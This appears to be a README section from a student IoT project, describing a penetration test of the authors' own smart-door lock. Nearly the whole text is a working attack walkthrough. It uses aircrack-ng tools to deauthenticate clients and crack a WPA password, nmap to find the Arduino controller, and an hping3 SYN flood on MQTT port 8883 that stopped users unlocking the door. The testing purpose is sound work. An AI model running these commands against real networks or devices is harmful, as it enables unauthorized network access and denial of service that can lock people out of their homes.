# Security Testing
## Accessing Network
To access the network, we would have to crack the password to enter WiFi network which is done using Kali Linux. To do so, we first need a wireless adapter which in our case is named "wlan0". We would then first stop any concurrent activity using the WiFi interface by running the following command on the terminal:
```console
kali@kali:~$ airmon-ng check kill
```
We then run the next command to enter montiring mode on the wlan0 interface.
```console
kali@kali:~$ airmon-ng start wlan0
```
After that, we would first view all the WiFi networks around us and find our target network by running the command.
```console
kali@kali:~$ airodump-ng wlan0mon
```
At this point we are able to view the different SSID, MAC address of WAP, channels, etc. Once target network is found, we will view all the connected clients by using the command:
```console
kali@kali:~$ airodump-ng -c <channel no.> --bssid <MAC Address of WAP> -w <Name of file for output> wlan0mon
```
From here, we will open up another terminal to disconnect the clients connected to the target network by running the command.
```console
kali@kali:~$ aireplay-ng -0 10 -a <MAC address of WAP> wlan0mon
```
Note:</br>-0 : For deauthentication</br>
       10 : No. of deauthentication packets to be sent</br>
      -a : For the bssid of the target network</br>

Once all clients are disconnected from the target network, we will wait for clients to join back and receive a WPA handshake from this process. After this we will crack the password using the output file we created from the command to view the connected clients to the network. We will run the command:
```console
kali@kali:~$ aircrack-ng -a2 -b <MAC Address of WAP> -w <Output file path> <File of Common Passwords>
```
Note: File of common passwords can be retrieved from crunch tools on https://www.kali.org/tools/crunch/. </br>
We then waited until the WiFi password is matched, hence, we are now able to access the network.

## Finding Target Device
After accessing the network, we will need to find the IP address fo the target device in order to perform attacks on it. To do this we will be using a network scanning tool on Kali Link called "nmap". We will run the follwing command to scan the network we are in.
```console
kali@kali:~$ sudo nmap -sn <Network_Address>
```
This will provide us with the IP address, MAC address and manufacturer name of the devices connected in the network. With that we can discover the Arduino manufactured device on the network which is our target since it will control the lock and camera of the smart door. Thus, we can perform our attack with this information.

## Attack Performed on Target Device
Conducted a denial-of-service (DOS) attack by using the "hping3" tool which allows us to send manipulated packets including size, quantity, and fragmentation of packets in order to overload the target.
</br>
</br>
Command Used:
```console
kali@kali:~$ sudo hping3 "IP ADDRESS of Target" -q -n -d 120 -S -p 8883 --flood --rand-source
```
Note: Port used is 8883 (MQTT TLS port). </br>

We were successful in disrupting the MQTT services which disallowed the users from unlocking their door. To stop the DOS attack, press Ctrl+C on keyboard.</br>

## Video of Penetration Testing
[![Video of Penetration Testing](Img/thumbnail.jpeg)](https://youtu.be/H-ZGN0VNeEk)
